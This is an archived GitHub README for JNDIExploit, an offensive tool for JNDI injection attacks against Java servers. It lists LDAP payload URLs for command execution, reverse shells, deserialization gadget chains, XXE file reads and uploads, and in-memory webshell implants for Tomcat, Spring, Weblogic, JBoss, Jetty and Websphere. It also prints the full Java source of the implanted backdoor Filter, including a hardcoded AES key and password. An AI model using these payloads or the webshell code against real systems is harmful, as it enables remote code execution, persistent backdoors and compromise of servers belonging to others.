December 13, 2021 03:01

https://web.archive.org/web/20211213030144/https://github.com/feihong-cs/JNDIExploit/   

[JNDIExploit.v1.2.zip release download here](https://github.com/Mr-xn/JNDIExploit-1/releases/tag/v1.2) or from web.archive.org ↑

# JNDIExploit
A tool for ```JNDI injection```, a large number of the code refer to ```Rogue JNDI``` project, support direct ```implant memory shell```, and integrate common The ```bypass high version JDK``` method is suitable for use with automation tools.

## Usage

```java -jar JNDIExploit.jar -h``` : view parameter description，```--ip``` is necessary

```
Usage: java -jar JNDIExploit.jar [options]
  Options:
  * -i, --ip       Local ip address
    -l, --ldapPort Ldap bind port (default: 1389)
    -p, --httpPort Http bind port (default: 8080)
    -u, --usage    Show usage (default: false)
    -h, --help     Show this help
```

## Dockerfile
```bash
git clone https://github.com/feihong-cs/JNDIExploit.git
cd ./JNDIExploit
docker build -t jndiexploit .
docker run -it \
    -p 1389:1389 \
    -e LDAP_PORT=1389 \
    -p 80:80 \
    -e HTTP_PORT=80 \
    jndiexploit
```

```java -jar JNDIExploit.jar -u``` : view supported LDAP formats
```
Supported LADP Queries
* all words are case INSENSITIVE when send to ldap server

[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.
    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]
    ldap://127.0.0.1:1389/Basic/Command/[cmd]
    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/Basic/TomcatEcho
    ldap://127.0.0.1:1389/Basic/SpringEcho
    ldap://127.0.0.1:1389/Basic/WeblogicEcho
    ldap://127.0.0.1:1389/Basic/TomcatMemshell1
    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]
    ldap://127.0.0.1:1389/Basic/JettyMemshell
    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1
    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2
    ldap://127.0.0.1:1389/Basic/JBossMemshell
    ldap://127.0.0.1:1389/Basic/WebsphereMemshell
    ldap://127.0.0.1:1389/Basic/SpringMemshell

[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]
    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho
    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho
    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho
    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1
    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1
    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells

[+] TomcatBypass Queries
    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]
    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]
    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho
    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho
    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1
    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]
    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell

[+] GroovyBypass Queries
    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]
    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]

[+] WebsphereBypass Queries
    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell
    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
```
* Currently supported ```PayloadType``` ：
  * ```Dnslog```: used to make a```DNS```request， Cooperate with```DNSLog```platform ，simply adapt to```Linux/Windows```
  * ```Command```: used to execute the command, if the command has special characters, it supports the transmission after ```Base64 encoding```
  * ```ReverseShell```: used to ```Linux``` System's rebound shell
  * ```TomcatEcho```: used to show the result of execute command when the middleware is```Tomcat``` ，by adding custom of```header``` ```cmd: whoami``` and so on
  * ```SpringEcho```: used to show the result of execute command when frame is```SpringMVC/SpringBoot```，by adding custom of```header``` ```cmd: whoami``` 
  * ```WeblogicEcho```: used to show the result of execute command when the middleware is ```Weblogic```，by adding custom of```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```TomcatMemshell1```: used to implant```Tomcat RAM shell```， support```Behinder shell``` and ```Basic cmd shell```
  * ```TomcatMemshell2```: used to implant```Tomcat RAM shell```， support```Behinder shell``` and ```Basic cmd shell```, need to add additional```HTTP Header``` ```Shell: true```, **Recommended **
  * ```SpringMemshell```: used to implant```Spring RAM shell```， support```Behinder shell``` and ```Basic cmd shell```
  * ```WeblogicMemshell1```: used to implant```Weblogic RAM shell```， support```Behinder shell``` and ```Basic cmd shell```
  * ```WeblogicMemshell2```: used to implant```Weblogic RAM shell```， support```Behinder shell``` and ```Basic cmd shell```，**Recommended**
  * ```JettyMemshell```: used to implant```Jetty RAM shell```， support```Behinder shell``` and ```Basic cmd shell```
  * ```JBossMemshell```: used to implant```JBoss RAM shell```， support```Behinder shell``` and ```Basic cmd shell```
  * ```WebsphereMemshell```: used to implant```Websphere RAM shell```， support```Behinder shell``` and ```Basic cmd shell```
* Currently supported ```GadgetType``` ：
  * ```URLDNS```
  * ```CommonsBeanutils1```  
  * ```CommonsBeanutils2```
  * ```CommonsCollectionsK1```
  * ```CommonsCollectionsK2```
  * ```C3P0```
  * ```Jdk7u21```
  * ```Jre8u20```
  * ```CVE_2020_2551```
  * ```CVE_2020_2883```
* ```WebsphereBypass``` three actions：
  * ```list```：View the contents of directories or files on the target server based on```XXE```
  * ```upload```：The ```jar protocol``` based on the ```XXE``` will upload the malicious ```jar package``` to the temporary directory of the target server 
  * ```rce```：Load the```jar package``` uploaded to the temporary directory of the target server, so as to achieve the effect of remote code execution（This step was not successfully replicated locally，throw```java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.```，if your reproduction is successful, please give a guideance）

## ```RAM shell```
* Add```Filter/Controller```dynamically and move the added ```Filter``` to the first position of ```FilterChain```
* The result of ```RAM shell``` 's compatibility test refer to [memshell](https://github.com/feihong-cs/memShell) 
* ```Basic cmd shell``` 's access mode is ```/anything?type=basic&pass=[cmd]```
* ```Behinder shell``` 's access mode need to modify ```Ice Scorpion```client（refer to [冰蝎改造之适配基于tomcat Filter的无文件webshell](https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ) ），and add ```X-Options-Ai``` header when access it，password:```rebeyond```

Implanted Filter code：
```
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("[+] Dynamic Filter says hello");
        String k;
        Cipher cipher;
        if (servletRequest.getParameter("type") != null && servletRequest.getParameter("type").equals("basic")) {
            k = servletRequest.getParameter("pass");
            if (k != null && !k.isEmpty()) {
                cipher = null;
                String[] cmds;
                if (File.separator.equals("/")) {
                    cmds = new String[]{"/bin/sh", "-c", k};
                } else {
                    cmds = new String[]{"cmd", "/C", k};
                }

                String result = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A").next();
                servletResponse.getWriter().println(result);
            }
        } else if (((HttpServletRequest)servletRequest).getHeader("X-Options-Ai") != null) {
            try {
                if (((HttpServletRequest)servletRequest).getMethod().equals("POST")) {
                    k = "e45e329feb5d925b";
                    ((HttpServletRequest)servletRequest).getSession().setAttribute("u", k);
                    cipher = Cipher.getInstance("AES");
                    cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
                    byte[] evilClassBytes = cipher.doFinal((new BASE64Decoder()).decodeBuffer(servletRequest.getReader().readLine()));
                    Class evilClass = (Class)this.myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke((Object)null, evilClassBytes, Thread.currentThread().getContextClassLoader());
                    Object evilObject = evilClass.newInstance();
                    Method targetMethod = evilClass.getDeclaredMethod("equals", ServletRequest.class, ServletResponse.class);
                    targetMethod.invoke(evilObject, servletRequest, servletResponse);
                }
            } catch (Exception var10) {
                var10.printStackTrace();
            }
        } else {
            filterChain.doFilter(servletRequest, servletResponse);
        }

    }
 ```
 
 ## Reference
 * https://github.com/veracode-research/rogue-jndi
 * https://github.com/welk1n/JNDI-Injection-Exploit
 * https://github.com/welk1n/JNDI-Injection-Bypass
